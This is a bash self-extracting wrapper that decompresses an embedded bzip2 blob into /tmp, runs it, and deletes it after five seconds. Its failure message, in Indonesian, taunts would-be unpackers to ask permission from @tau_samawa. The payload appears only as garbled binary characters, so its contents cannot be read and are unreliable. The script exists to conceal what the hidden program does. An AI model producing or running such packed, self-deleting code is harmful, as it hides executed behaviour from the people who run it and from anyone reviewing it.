#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SYȟc  �_�D0}������~����P>ց@  ��z�h�  �    E4�6���F�  h� � ���&�C##&��4@44�b q���ddd���#�F�C@��M �4�*~��='�f��x��jm2��M2~���_|��UJ��U)%%T(��q����b/�M�H��<��аHm�A�9����਀�K��hz�3u٩��.�������0��g��9�q��}�GH��Z���8�U�1�U��1��4�.���j}'�����W�wz��U;ۍ-�_�!��dT<�~<�V�o����r�]�u�К��`�Z�?�w�x��T�\�wG���`h?2�'�X�5Q.>�݊۟�>����Y�w��3u��ky��������OW�u[�0�f�ƍ&:xTw�18Y�����|�tٗ�4�`�:@Jc��X�Dh�Ϧx@j�d�'9��p͟���d�h�n��%�ߴ�,�:�*��Ѿm:��O�cJȱU/��oYotj.�h̴��,u�4Y���j5�����i�d����I�8l�KQ��i��qڹ�p����K�{u��͚x�����|�h��T|�u=n���������������f?�y<�X'�ެmΣ&A����̽�=��l��4��zbw�>&i��˯8z��2mNOZ�*o8�UUrU���Y�I��־:�-a��a:[�3󌟥娤��of��,n�&��\�����eeM<U�ws�<��a���8��3�r�l�*��1͍-���_�t���6f٧��1��F�������M�fwi4(��oMk�N.�V�j�R��9_7;\Ӓ��D�FԚ[��r��hT�\{K�E*r�j��͎��������;+�y�#�ߔ�^Z�l��5r���I�;�<Չ��Y"m��VK�.�I�t�-4縉���]'�n�^6�jo��RQ�%-s�(\�cV���>�a�30�ܸ�M)�d�ל��y�j�	(�نz,�o'���K�V��g1Q��7�G#�)��z�,<}O��U�:�֧�^	��"�(HdO�� 